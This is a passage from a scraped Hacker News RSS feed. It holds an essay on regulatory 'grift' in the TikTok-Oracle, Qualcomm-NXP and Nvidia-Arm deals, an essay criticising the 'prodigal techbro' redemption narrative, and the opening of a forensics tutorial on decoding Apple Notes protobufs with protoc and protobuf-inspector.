Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531657">thread link</a>) | @ceohockey60
<br/>
September 19, 2020 | https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>The dictionary definition of the word ‚Äúgrift‚Äù is as follows: ‚Äú<a href="https://www.merriam-webster.com/dictionary/grift">to acquire money or property illicitly</a>‚Äù. It may be a strong word, but also more or less encapsulates the regulatory ethos that‚Äôs governing cross-border technology businesses these days.</p><p>The TikTok-Oracle deal flaunts this grifting ethos, but it‚Äôs just the latest example of a series of haphazard regulatory actions mired in geopolitical brinkmanship -- a trend that may implicate deals with much larger impact, like the pending Nvidia acquisition of Arm.</p><h2 id="tiktok-oracle">TikTok-Oracle</h2><p>There are still many missing details to the TikTok-Oracle deal, and Trump <a href="https://uk.reuters.com/article/us-usa-tiktok-oracle/trump-raises-questions-about-tiktok-oracle-deal-if-bytedance-ties-remain-idUKKBN2672KD">may not approve the deal</a>. But in the grand scheme of things, many of these details are no longer important, because the spirit of the entire TikTok ‚Äúsoap opera‚Äù is cemented: a <strong>regulatory grift </strong>by the Trump administration that enriches its political donor (Larry Ellison), strengthens its campaign message (anti-China, job creation), while doing next to nothing to protect Americans from either intrusive data collection or foreign influence.</p><p>Let‚Äôs look at each of these malfeasances.</p><p><strong><em>What Oracle gets.</em></strong> TikTok‚Äôs immediate business value accrues to Oracle Cloud to the tune of possibly <a href="https://www.theinformation.com/articles/with-tiktok-deal-oracle-could-gain-billion-dollar-cloud-customer?utm_content=article-4850&amp;utm_campaign=article_email&amp;utm_source=sg&amp;utm_medium=email">$1 billion in annual revenue</a> in the coming years, as it desperately tries to catch up to AWS and Azure. The Oracle brand may also get a boost from this young, cool consumer product, even though Oracle has no experience running such a product. Since I‚Äôve written in detail about TikTok‚Äôs business value in ‚Äú<a href="https://interconnected.blog/what-is-tiktok-worth-to-whom-and-why/"><strong>What is TikTok Worth to Whom and Why?</strong></a>‚Äù, I won‚Äôt repeat myself here. <strong>One element I did not discuss so explicitly is how valuable TikTok‚Äôs user data is to the Oracle data broker business.</strong></p><p>In a nutshell, a data broker sells data to third parties mostly for marketing or advertisement purposes. Oracle‚Äôs data broker businesses are euphemistically called <a href="https://www.oracle.com/cx/marketing/">Oracle CX Marketing</a> and <a href="https://www.oracle.com/data-cloud/">Oracle Data Cloud</a>. Having the treasure trove of data that TikTok has already collected is perhaps an even more immediate business boost to Oracle than getting the product‚Äôs workload onto its cloud. Ironically (or perhaps appropriately), the person who called out the privacy violations of data brokers like Oracle, Equifax, and others is <a href="https://www.linkedin.com/in/michael-beckerman-9b750a58/"><strong>Michael Berkerman</strong></a><strong>, who is currently TikTok US‚Äôs Head of Public Policy</strong>. He did so last year as the then President and CEO of the Internet Association in <a href="https://www.foxnews.com/opinion/michael-beckerman-why-do-we-need-a-federal-privacy-law-ask-the-data-brokers-selling-your-private-information">an OpEd published on Fox News</a> -- a ‚Äúmedia‚Äù outlet that the President of the United States most certainly pays attention to. I wonder how long Berkerman will be sticking around, if at all, after the TikTok-Oracle deal closes.</p><p>Lastly, Oracle will likely get a <a href="https://www.ft.com/content/58eb7c26-2154-477f-af19-19157ae29261">minority stake in TikTok</a> with ByteDance still being the majority shareholder. This piece of equity in one of the most valuable private tech companies in the world -- trading at a $140 billion valuation in the secondary market earlier this year -- is something that Oracle would have no business getting in a normal investing situation. Not a bad deal <a href="https://www.businessinsider.com/oracle-billionaire-larry-ellison-is-fundraising-for-donald-trump-2020-2">for hosting a single fundraiser</a>.</p><p><strong><em>What the Trump campaign gets.</em> </strong>Being more ‚Äúanti-China‚Äù than Biden and going after the Vice President‚Äôs son‚Äôs business dealings in China has been a messaging tentpole of the Trump re-election campaign. It can now claim credit for acting tough and forcing a marquee Chinese tech company to ‚Äúsurrender‚Äù its crown jewel product to America, while accomplishing none of those things, because TikTok‚Äôs core technology is staying with ByteDance in China.</p><p>The Oracle bid also apparently includes a ‚Äú<strong>20,000 new jobs‚Äù </strong>commitment -- a typical public relations promise with no legally binding effect. Being ‚Äúanti‚Äù-China while ‚Äúcreating‚Äù jobs is a strong one-two punch as we approach the final stretch of the 2020 election season, so much so that Secretary Mnuchin couldn't wait to sell the 20,000 jobs message on CNBC the day after Oracle‚Äôs winning bid was made public, <em>even though</em> the deal hasn‚Äôt been approved or finalized yet.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/ZPRPswu2Cyc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>TikTok US‚Äôs current payroll is about 1,400 people. <strong>That would be an almost 20x increase in headcount.</strong> Theoretically possible? Sure. Practical and sensible? Hardly.</p><p><em><strong>What the American people get.</strong> </em>Nothing, except that they still get to watch cool dance videos and <a href="https://www.tiktok.com/@rosssmith/video/6797540353730743557">grandmas do this</a> on their phones. We have no new information or answer to any of the three legitimate concerns surrounding TikTok:</p><ul><li>Does it send data to China?</li><li>Is its user data collection practices proper?</li><li>Is it being used as a tool for foreign influence?</li></ul><p>To be clear, there <em>are</em> regulatory tools based on technology at our disposal to answer these questions, <strong>with or without Oracle</strong>. I‚Äôve laid them out in detail in ‚Äú<a href="https://interconnected.blog/a-framework-to-dis-trust-and-verify-tiktok/"><strong>A Framework to (Dis)trust and Verify TikTok</strong></a>‚Äù. Unfortunately, it‚Äôs clear as day that the Trump administration is only interested in the political messaging benefits of TikTok-Oracle, not doing the actual work that is required to protect the interests of the American people.</p><p><strong>There is another winner that we should all take note of: <em>Chinese regulators.</em></strong></p><p>Chinese regulators typically use their power to force technology and IP transfers from foreign entities to domestic companies via joint-ventures or outright acquisitions -- <strong>another form of regulatory grift</strong>. This TikTok-Oracle deal is the first time to my knowledge, where Chinese regulators use their power to protect a home-grown technology from being <em>transferred out</em> to a foreign entity.</p><p>This win has just as much to do with exerting their regulatory power as the sucker on the other side of the negotiation table. This dynamic isn‚Äôt new, if we look at the failed NXP-Qualcomm acquisition in 2018.</p><h2 id="nxp-qualcomm">NXP-Qualcomm</h2><p>Qualcomm‚Äôs attempt to buy the Dutch semiconductor maker, NXP, for $44 billion was abandoned, because it could not get approval from Chinese regulators. This occurred during the previous height of tension when the U.S. and China were tossing retaliatory trade tariffs at each other like a couple of teenage boys in a backyard snowball fight.</p><p>The Chinese regulators did not disapprove of the deal and asked for changes to gain approval, which would‚Äôve been a good faith move. <strong>They just ignored it and let the deadline pass.</strong> This is after Secretary Mnuchin and his Commerce Department counterpart, Wilbur Ross, lobbied the Chinese Vice Minister, Liu He, and Ambassador to the US, Cui Tiankai, to approve the deal. The backdrop of this lobbying was Trump easing the penalties on the Chinese telecom equipment maker, ZTE, for violating U.S. sanction rules with regard to Iran and North Korea -- hoping for some reciprocity and dealmaking.</p><p>This foolish hope did not pan out. Instead, Qualcomm, America‚Äôs national champion in the race to 5G, had to fork up a <a href="https://www.wsj.com/articles/qualcomm-plans-to-abandon-nxp-deal-1532549728">$2 billion cancellation fee to NXP and increase its stock buyback program from $10 to $30 billion</a> to appease its shareholders. What‚Äôs more, this turn of events showed Chinese regulators that given the <strong>interconnected nature of the global economy</strong>, particularly technology businesses, they have far-reaching authority and leverage to shape deals, events, and technology acquisition vis-a-vis <strong>a tough-talking, weak-acting </strong>Trump administration. It is a key reversal in fortune, when a large swath of China‚Äôs technology sector, particularly Huawei, has been hammered by U.S. sanctions.</p><p>Qualcomm-NXP was a defensive play -- not approving a deal. TikTok-Oracle is a proactive play -- not losing control of domestic technology. <strong>There‚Äôs now an opportunity for even more aggressive ‚Äúregulatory grift‚Äù: Arm-Nvidia.</strong></p><h2 id="arm-nvidia">Arm-Nvidia</h2><p>It‚Äôs hard to comprehend the long-term impact that Nvidia‚Äôs $40 billion acquisition of Arm will have on the future of technology. One thing is certain though: it‚Äôs way more important than TikTok and Oracle, separately and combined.</p><p>We shouldn‚Äôt assume the Arm-Nvidia deal will be closed as expected given all the corporate governance issues with Arm‚Äôs China operation. Arm China‚Äôs CEO, Allen Wu, has been fired by the board for various acts of conflicts of interest and double dealing, <a href="https://www.zdnet.com/article/arms-fired-china-jv-head-refuses-to-leave-company-reps-banned-from-company-premises/">yet refuses to leave</a>. Arm‚Äôs CEO, Simon Segars, is trying to assure the public that the mess <a href="https://www.yicaiglobal.com/news/chip-designer-arm-to-solve-chinese-jv-management-issue-before-nvidia-buyout">will be cleaned up </a>in order to not endanger the sale, but he‚Äôs not in a position of leverage, now that the deal is public and the expectations are high. (Nvidia‚Äôs market cap increased by $17.5 billion the day after the deal was announced.)</p><p>Furthermore, the Arm China division is a joint-venture where 51% of the entity is owned by a consortium of these three funds:</p><ul><li><a href="https://en.wikipedia.org/wiki/China_Investment_Corporation">China Investment Corporation</a> (China‚Äôs sovereign wealth fund)</li><li><a href="https://en.wikipedia.org/wiki/Silk_Road_Fund">Silk Road Fund</a> (a state-owned fund focused on projects related to the Belt &amp; Road Initiative)</li><li><a href="https://en.wikipedia.org/wiki/Temasek_Holdings">Temasek Holding</a> (Singapore‚Äôs sovereign wealth fund)</li></ul><p>The other 49% is owned by Softbank via Arm. The joint venture structure is par for the course for any foreign technology company doing business in China. But such a tight ownership by state-owned funds means Chinese regulators (and Singaporean regulators for that matter) have strong jurisdictional power over the deal from the get-go. NXP-Qualcomm‚Äôs legal hook was a tenuous nexus. TikTok-Oracle‚Äôs hook was established by <a href="https://en.pingwest.com/a/7657">an eleventh hour change</a> to the government‚Äôs technology ‚Äúentity list‚Äù. Arm-Nvidia doesn‚Äôt need any extra work for regulators to aggressively insert themselves into the picture.</p><p>What will the Chinese regulators do is hard to tell at this moment. However, given the fact that Arm‚Äôs chip design IP has a 95% global market share in mobile devices and is <a href="https://www.zdnet.com/article/aws-graviton2-what-it-means-for-arm-in-the-data-center-cloud-enterprise-aws/">making inroads into cloud data centers</a> as well, <strong>it‚Äôs likely that China will either veto the deal (like NXP-Qualcomm) or try to keep any semiconductor IP that Arm China has even a tangential connection to</strong>. Some Chinese tech media <a href="https://mp.weixin.qq.com/s/W8nhj6udDTdr54ui7_0RIQ">are already speculating about a veto</a>. Using this opportunity to acquire some key technology also makes sense, because by <em>not</em> doing so, China runs the monumental risk of having the entire Arm ecosystem be subject to U.S. sanctions after it becomes a property of Nvidia. An ‚Äú<strong>Arm sanction</strong>‚Äù would cripple China‚Äôs entire mobile technology sector, where domestic chip design options barely exist and the open source option, RISC-V, still ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531657</guid>
            <pubDate>Sun, 20 Sep 2020 03:08:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Prodigal Techbro]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24531490">thread link</a>) | @cyunker
<br/>
September 19, 2020 | https://conversationalist.org/2020/03/05/the-prodigal-techbro/ | <a href="https://web.archive.org/web/*/https://conversationalist.org/2020/03/05/the-prodigal-techbro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

               <div>


                  <p><em>The tech executive turned data justice warrior is celebrated as a truth-telling hero, but there‚Äôs something a bit too smooth about this narrative arc.</em></p><div><p><img src="https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris.jpg" alt="" srcset="https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris.jpg 799w, https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris-300x200.jpg 300w, https://conversationalist.org/wp-content/uploads/2020/03/Tristan-Harris-768x512.jpg 768w" sizes="(max-width: 640px) 100vw, 640px"></p><p><span>Credit: Stuart Isett/Fortune</span><span></span></p></div>
<p>A few months ago, I was contacted by a senior executive who was about to leave a marketing firm. He got in touch because I‚Äôve worked on the non-profit side of tech for a long time, with lots of volunteering on digital and human rights. He wanted to ‚Äògive back‚Äô. Could I put him in touch with digital rights activists? Sure. We met for coffee and I made some introductions. It was a perfectly lovely interaction with a perfectly lovely man. Perhaps he will do some good, sharing his expertise with the people working to save democracy and our private lives from the surveillance capitalism machine of his former employers. The way I rationalized helping him was: firstly, it‚Äôs nice to be nice; and secondly, movements are made of people who start off far apart but converge on a destination. And isn‚Äôt it an unqualified good when an insider decides to do the right thing, however late?</p>
<p>The Prodigal Son is a New Testament parable about two sons. One stays home to work the farm. The other cashes in his inheritance and gambles it away. When the gambler comes home, his father slaughters the fattened calf to celebrate, leaving the virtuous, hard-working brother to complain that all these years he wasn‚Äôt even given a small goat to share with his friends. His father replies that the prodigal son ‚Äòwas dead, now he‚Äôs alive; lost, now he‚Äôs found‚Äô. Cue party streamers. It‚Äôs a touching story of redemption, with a massive payload of moral hazard. It‚Äôs about coming home, saying sorry, being joyfully forgiven and starting again. Most of us would love to star in it, but few of us will be given the chance.</p>
<p>The Prodigal Tech Bro is a similar story, about tech executives who experience a sort of religious awakening. They suddenly see their former employers as toxic, and reinvent themselves as experts on taming the tech giants. They were lost and are now found. They are warmly welcomed home to the center of our discourse with invitations to write opeds for major newspapers, for think tank funding, book deals and TED talks. These guys ‚Äì and yes, they are all guys ‚Äì are generally thoughtful and well-meaning, and I wish them well. But I question why they seize so much attention and are awarded scarce resources, and why they‚Äôre given not just a second chance, but also the mantle of moral and expert authority.</p>
<p>I‚Äôm glad that Roger McNamee, the early Facebook investor, has <a href="https://www.theguardian.com/world/2020/feb/29/rebecca-solnit-younger-feminists-shift-understanding-give-new-tools">testified to the U.S. Congress</a> about Facebook‚Äôs wildly self-interested near-silence about its amplification of Russian disinformation during the 2016 presidential election. I‚Äôm thrilled that Google‚Äôs ex-‚Äòdesign ethicist‚Äô, Tristan Harris, ‚Äú<a href="https://www.theguardian.com/world/2020/feb/29/rebecca-solnit-younger-feminists-shift-understanding-give-new-tools">the </a><em>closest thing Silicon Valley has to a conscience,</em>‚Äú(startlingly faint praise) now runs a Center for Humane Technology, exposing the mind-hacking tricks of his former employer. I even <a href="https://www.youtube.com/watch?v=3hSrUaSNFSY&amp;t=2309s">spoke</a> ‚Äîcritically but, I hope, warmly‚Äîat the book launch of James Williams, another ex-Googler turned attention evangelist, who ‚Äú<a href="https://en.wikipedia.org/wiki/Center_for_Humane_Technology">co-founded the movement</a>‚Äùof awareness of designed-in addiction. I wish all these guys well. I also wish that the many, exhausted activists who didn‚Äôt take money from Google or Facebook could have even a quarter of the attention, status and authority the Prodigal Techbro assumes is his birth-right.</p>
<p>Today, when the tide of public opinion on Big Tech is finally turning, the brothers (and sisters) who worked hard in the field all those years aren‚Äôt even invited to the party. No fattened calf for you, my all but unemployable tech activist. The moral hazard is clear; why would anyone do the right thing from the beginning when they can take the money, have their fun, and then, when the wind changes, convert their status and relative wealth into special pleading and a whole new career?</p>
<p>Just half an hour flipping through my contacts produced half a dozen friends and acquaintances who didn‚Äôt require a ‚Äòroad to Damascus‚Äô conversion to see what was wrong with big tech or the ways governments abuse it. Nighat Dad runs the <a href="https://digitalrightsfoundation.pk/">Digital Rights Foundation in Pakistan</a>, defending online freedom of expression and privacy for women, minorities and dissidents. That‚Äôs real courage. <a href="https://privacyinternational.org/people/95/gus-hosein">Gus Hosein</a> has worked in tech and human rights for over 20 years, runs Privacy International, the UK-based non-profit, and is the most visionary thinker I know on how to shake up our assumptions about why things are as they are.&nbsp; <a href="https://biancawylie.com/">Bianca Wylie </a>founded the volunteer-run Open Data Institute Toronto, and works on open data, citizen privacy and civic engagement. The ‚Äú<a href="https://www.citylab.com/life/2018/12/bianca-wylie-interview-toronto-quayside-protest-criticism/574477/">Jane Jacobs of the Smart Cities Age</a>,‚Äù she‚Äôs been a key figure in opening up and slowing down Alphabet‚Äôs Sidewalk Labs juggernaut in Toronto. Aral Balkan runs <a href="https://small-tech.org/">Small Technology Foundation </a>and works on both the tools and the policies to resist surveillance capitalism. Unafraid of being unpopular, even with other activists, Balkan freely hammers rights organizations or conferences for taking big tech‚Äôs sponsorship money while criticizing the companies‚Äô practices. In the western Balkans, <a href="https://hvale.me/">hvale vale</a><a href="#_ftn10" name="_ftnref10"></a> works tirelessly and cheerfully on women‚Äôs rights, sexual rights and the political and practical path to a feminist internet. <a href="https://en.wikipedia.org/wiki/Robin_Gross">Robin Gross</a>, &nbsp;a Californian intellectual property lawyer, could have put her persistence and sheer pizazz to work defending big entertainment companies, but instead she‚Äôs worked for decades against the copyright maximalism that strangles artists‚Äô creativity and does nothing to increase their incomes. I would love to hear their voices amplified, not (just) the voices of those who took a decade and more to work out the rottenness at the core of big tech.</p>
<p>Ex-Google lobbyist Ross Lajeunesse left the company in 2019 over its censored search engine for China and also because of homophobic, sexist and racist work practices. He‚Äôs now running for a Democratic senate nomination, and recently wrote a classic of the ‚Äòscales have fallen from my eyes‚Äô genre, called ‚ÄúI Was Google‚Äôs Head of International Relations. <a href="https://medium.com/@rossformaine/i-was-googles-head-of-international-relations-here-s-why-i-left-49313d23065">Here‚Äôs Why I Left</a>.‚Äù Its lede is <em>‚ÄúThe company‚Äôs motto used to be ‚ÄúDon‚Äôt be evil.‚Äù Things have changed.‚Äù</em></p>
<p>Really? Has Google really changed? Lajeunesse joined in 2008, years into Google‚Äôs multi-billion dollar <a href="https://www.bloomberg.com/news/articles/2010-10-21/google-2-4-rate-shows-how-60-billion-u-s-revenue-lost-to-tax-loopholes">tax avoidance</a>, <a href="https://www.cnet.com/news/google-hit-with-job-discrimination-lawsuit/">sexist labor practices</a> and <a href="http://news.bbc.co.uk/2/hi/technology/6740075.stm">privacy hostility</a> and continued to work there through the years of <a href="https://www.bbc.co.uk/news/technology-40406542">antitrust fines</a>, misuse of <a href="https://www.bbc.com/news/technology-40406542">personal health data</a>, <a href="https://www.cnet.com/news/judge-rejects-324-5m-wage-fixing-settlement-struck-by-apple-google-others/">wage fixing</a>, and financially <a href="https://www.nytimes.com/2017/08/30/us/politics/eric-schmidt-google-new-america.html">pressuring think tanks</a>. Google didn‚Äôt change. It just started treating some of its insiders like it already treated outsiders. That only looks like radical change if you‚Äôve never thought too hard about what you are doing and to whom.</p>
<p>One hundred thousand people work for Google/Alphabet; some of them have much more power than others. The point isn‚Äôt whether Lajeunesse is or isn‚Äôt culpable for the many acts of the enormous company he represented‚Äîas its chief lobbyist in Asia for several years‚Äîit‚Äôs that of all the people who spent the decade of 2010-20 working thanklessly to expose and reduce the firm‚Äôs monopolistic abuse and assault on global privacy, it‚Äôs the ex-lobbyist who gets our attention now.</p>
<p>We all need second chances. Even if we don‚Äôt need those fresh starts ourselves, we want to live in a world where people have a reason to do better. But the prodigal tech bro‚Äôs redemption arc is so quick and smooth it‚Äôs barely a road bump. That‚Äôs because we keep skipping the most important part of the prodigal son story‚Äîwhere he hits rock bottom. In the original parable, the prodigal son wakes up in a pig sty, starving, and realizes his father‚Äôs servants now live better than he does. He resolves to go home to the people and place he did not value or respect before. He will beg to be one of his father‚Äôs servants. He accepts his complete loss of status. But instead of chastising and punishing his prodigal son, the rejoicing father greets him joyfully and heads off the apology with a huge party. It‚Äôs a great metaphor for how to run a religion, but a lousy way to run everything else.</p>
<p>Prodigal tech bro stories skip straight from the past, when they were part of something that‚Äîsurprise!‚Äîturned out to be bad, to the present, where they are now a moral authority on how to do good, but without the transitional moments of revelation and remorse. &nbsp;But the bit where you say you got things wrong and people were hurt? That‚Äôs the most important part. It‚Äôs why these corporatized reinventions feel so slick and tinny, and why so many of the comments on Lajeunesse‚Äôs <a href="https://medium.com/@rossformaine/i-was-googles-head-of-international-relations-here-s-why-i-left-49313d23065">train wreck post</a> on Medium were critical. The journey feels fake. These ‚ÄòI was lost but now I‚Äôm found, please come to my TED talk‚Äô accounts typically miss most of the actual journey, yet claim the moral authority of one who‚Äôs ‚Äòbeen there‚Äô but came back. It‚Äôs a teleportation machine, but for ethics.</p>
<p>(While we‚Äôre thinking about the neatly elided parts of the prodigal tech bro story, let‚Äôs dwell for one moment on the deletion of the entire stories of so many women and people of color barely given a first chance in Silicon Valley, let alone multiple reinventions.)</p>
<p>The only thing more fungible than cold, hard cash is privilege. The prodigal tech bro doesn‚Äôt so much take an off-ramp from the relatively high status and well-paid job he left when the scales fell from his eyes, as zoom up an on-ramp into a new sector that accepts the reputational currency he has accumulated. He‚Äôs not joining the resistance. He‚Äôs launching a new kind of start-up using his industry contacts for seed-funding in return for some reputation-laundering.</p>
<p>So what? Sure, it‚Äôs a little galling, but where‚Äôs the harm?</p>
<p>Allowing people who share responsibility for our tech dystopia to keep control of the narrative means we never get to the bottom of how and why we got here, and we artificially narrow the possibilities for where we go next. And centering people who were insiders before and claim to be leading the outsiders ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://conversationalist.org/2020/03/05/the-prodigal-techbro/">https://conversationalist.org/2020/03/05/the-prodigal-techbro/</a></em></p>]]>
            </description>
            <link>https://conversationalist.org/2020/03/05/the-prodigal-techbro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531490</guid>
            <pubDate>Sun, 20 Sep 2020 02:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Apple Notes Protobuf]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531472">thread link</a>) | @todsacerdoti
<br/>
September 19, 2020 | https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/ | <a href="https://web.archive.org/web/*/https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"> <p><strong>TL;DR</strong>: This post explains portions of two protobufs used by Apple, one for the Note format itself and another for embedded objects. More importantly, it explains how you can figure out the structure of protobufs.</p> <!--more--> <h2 id="background">Background</h2> <p>Previous entries in this series covered how to deal with <a href="https://ciofecaforensics.com/2020/01/10/apple-notes-revisited/">Apple Notes</a> and the <a href="https://ciofecaforensics.com/2020/01/13/apple-notes-revisited-easy-embedded-objects/">embedded objects</a> in them, including <a href="https://ciofecaforensics.com/2020/01/14/apple-notes-revisited-embedded-tables/">embedded tables</a> and <a href="https://ciofecaforensics.com/2020/01/20/apple-notes-revisited-galleries/">galleries</a>. Throughout these posts, I have referred to the fact that Apple uses protocol buffers (protobufs) to store the information for both notes and the embedded objects within them. What I have not yet done is actually provide the .proto file that was used to generate the Ruby output, or explained how you can develop the same on your app of interest. If you only care about the first part of that, you can view the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/notestore.proto">.proto file</a> or the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/protobuf_config.py">config</a> I use for <a href="https://github.com/jmendeth/protobuf-inspector">protobuf-inspector</a>. Both of these files are just a start to pull out the important parts for processing and can certainly be improved.</p> <p>As with previous entries, I want to make sure I give credit where it is due. After pulling apart the Note protobuf and while I was trying to figure out the table protobuf, I came across <a href="https://github.com/dunhamsteve">dunhamsteve‚Äôs</a> work. As a result, I went back and modified some of my naming to better align to what he had <a href="https://github.com/dunhamsteve/notesutils/blob/master/notes.md">published</a> and added in some fields like version which I did not have the data to discover.</p> <h2 id="what-is-a-protocol-buffer">What is a Protocol Buffer?</h2> <p>To quote directly from <a href="https://developers.google.com/protocol-buffers">the source</a>,</p> <blockquote> <p>Protocol buffers are Google‚Äôs language-neutral, platform-neutral, extensible mechanism for serializing structured data ‚Äì think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p> </blockquote> <p>What does that mean? It means a protocol buffer is a way you can write a specification for your data and use it in many projects and languages with one command. The end result is source code for whatever language you are writing in. For example, <a href="https://github.com/sballin/alfred-search-notes-app/blob/master/search/proto/notestore.pb.go">Sean Ballinger‚Äôs Alfred Search Notes App</a> used my <code>notestore.proto</code> file to compile to Go instead of Ruby to interact with Notes on MacOS. When you use it in your program, the data which you save will be a raw data stream which won‚Äôt look like much, but will be intelligable to any code with that protobuf definition.</p> <p>The definition is generally a <code>.proto</code> file which would look something like:</p> <figure><pre><code data-lang="protobuf"><span>syntax</span> <span>=</span> <span>"proto2"</span><span>;</span>

<span>// Represents an attachment (embedded object)</span>
<span>message</span> <span>AttachmentInfo</span> <span>{</span>
   <span>optional</span> <span>string</span> <span>attachment_identifier</span> <span>=</span> <span>1</span><span>;</span>
   <span>optional</span> <span>string</span> <span>type_uti</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span></code></pre></figure> <p>This definition would have just one message type (AttachmentInfo), with two fields (attachment_identifier and type_uti), both optional. This is using the <code>proto2</code> syntax.</p> <h2 id="why-care-about-protobufs">Why Care About Protobufs</h2> <p>Protobufs are everywhere, especially if you happen to be working with or looking at Google-based systems, such as Android. Apple also uses a lot of them in iOS, and for people that have to support both operating systems, using a protobuf makes the pain of maintaining two different code bases slightly less annoying because you can compile the same definition to different languages. If you are in forensics, you may come across something that looks like it isn‚Äôt plaintext and discover that you‚Äôre actually looking at a protobuf. When it comes specifically to Apple Notes, protobufs are used both for the Note itself and the attachments.</p> <h2 id="how-to-use-a-proto-file">How to Use a .proto file</h2> <p>Assuming you have a <code>.proto</code> file, either from building one yourself or from finding one from your favorite application, you can compile it to your target language using <a href="https://github.com/protocolbuffers/protobuf/releases">protoc</a>. The resulting file can then be included in your project using whatever that language‚Äôs include statement is to create the necessary classes for the data. For example, when writing Apple Cloud Notes Parser in Ruby, I used <code>protoc --ruby_out=. ./proto/notestore.proto</code> to compile it and then <code>require_relative 'notestore_pb.rb'</code> in my code to include it.</p> <p>If I wanted instead to add in support for python, I would only have to make this change: <code>protoc --ruby_out=. --python_out=. ./proto/notestore.proto</code></p> <h2 id="how-can-you-find-a-protobuf-definition-file">How Can You Find a Protobuf Definition File?</h2> <p>If you come up against a protobuf in an application you are looking at, you might be able to find the <code>.proto</code> protobuf definition file in the application itself or somewhere on the forensic image. I ended up going through an iOS 13 forensic image earlier this year and found that Apple still had some of theirs on disk:</p> <figure><pre><code data-lang="shell"><span>[</span>notta@cuppa iOS13_logical]<span>$ </span>find | <span>grep</span> <span>'\.proto$'</span>
./System/Library/Frameworks/MultipeerConnectivity.framework/MultipeerConnectivity.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievementsBackCompat.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievements.proto
./System/Library/PrivateFrameworks/CoreLocationProtobuf.framework/Support/Harvest/CLPCollectionRequest.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDatabaseCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDomainCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingInvitationCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingCloudKitCodables.proto
./System/Library/PrivateFrameworks/CloudKitCode.framework/RecordTransport.proto
./System/Library/PrivateFrameworks/RemoteMediaServices.framework/RemoteMediaServices.proto
./System/Library/PrivateFrameworks/CoreDuet.framework/knowledge.proto
./System/Library/PrivateFrameworks/HealthDaemon.framework/Statistics.proto
./System/Library/PrivateFrameworks/AVConference.framework/VCCallInfoBlob.proto
./System/Library/PrivateFrameworks/AVConference.framework/captions.proto</code></pre></figure> <p>Some of these are <em>really</em> interesting when you look at them, particularly if you care about their location data and pairing. You don‚Äôt even have to have an iOS forensic image sitting around as all of the same files are included in your copy of MacOS 10.15.6, as well, if you run <code>sudo find /System/ -iname "*.proto"</code>. I am not including any interesting snippets of those because they are copyrighted by Apple and I would explicitly note that none are related to Apple Notes or the contents of this post.</p> <p>In general, you should not expect to find these definitions sitting around since the definition file isn‚Äôt needed once the code is generated. For more open source applications, you might be interested in some <a href="https://www.google.com/search?q=ext%3Aproto++AND+inurl%3Aproto+AND+message+AND+proto2">Google Dorks</a>, especially when looking at Android artifacts, as you might still find them.</p> <h2 id="how-can-you-rebuild-the-protobuf">How Can You Rebuild The Protobuf?</h2> <p>But what if you can‚Äôt find the definition file, how can you rebuild it yourself? This was the most interesting part of rewriting Apple Cloud Notes Parser as I had no knowledge of how Apple typically represents data, nor protobufs, so it was a fun learning adventure.</p> <p>If you have nothing else, the <code>protoc --decode-raw</code> command can give you an intial look at what is in the data, however this amounts to not much more than pretty printing a JSON object, it doesn‚Äôt do a great job of telling you you what might be in there. I made heavy use of mildsunrise‚Äôs <a href="https://github.com/mildsunrise/protobuf-inspector">protobuf-inspector</a> which at least makes an attempt to tell you what you might be looking at. Another benefit to using this is that it lets you incrementally build up your own definition by editing a file named <code>protobuf_config.py</code> in the protobuf-insepctor folder.</p> <p>For example, below is the output from protobuf-inspector when I ran it on the Gunzipped contents of one of the first notes in my test database.</p> <figure><pre><code data-lang="python"><span>[</span><span>notta</span><span>@</span><span>cuppa</span> <span>protobuf</span><span>-</span><span>inspector</span><span>]</span><span>$</span> <span>python3</span> <span>main</span><span>.</span><span>py</span> <span>&lt;</span> <span>~/</span><span>note_18</span><span>.</span><span>blob</span> 
<span>root</span><span>:</span>
